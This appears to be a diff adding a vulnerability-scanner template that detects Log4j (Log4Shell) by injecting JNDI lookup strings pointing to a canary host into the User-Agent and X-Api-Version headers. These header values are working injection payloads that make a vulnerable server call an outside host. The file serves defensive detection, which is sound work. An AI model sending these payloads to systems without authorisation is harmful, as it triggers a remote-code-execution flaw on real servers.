@@ -1,0 +1,21 @@
+id: anchorscan-canary-log4j
+info:
+  name: Anchorscan Log4j canary callback
+  author: anchorscan
+  severity: high
+  description: |
+    Plants canary_base/canary_token into common Log4j JNDI header slots.
+    The anchorscan process-local canary listener emits the Finding on callback
+    (confidence=verified); nuclei matchers are intentionally empty.
+  tags:
+    - canary
+    - log4j
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    headers:
+      User-Agent: "${jndi:http://{{canary_host}}/c/{{canary_token}}}"
+      X-Api-Version: "${jndi:http://{{canary_host}}/c/{{canary_token}}}"
+      Referer: "{{canary_base}}/c/{{canary_token}}"
+    # Channel self-check: no matchers — finding comes from canary listener only.
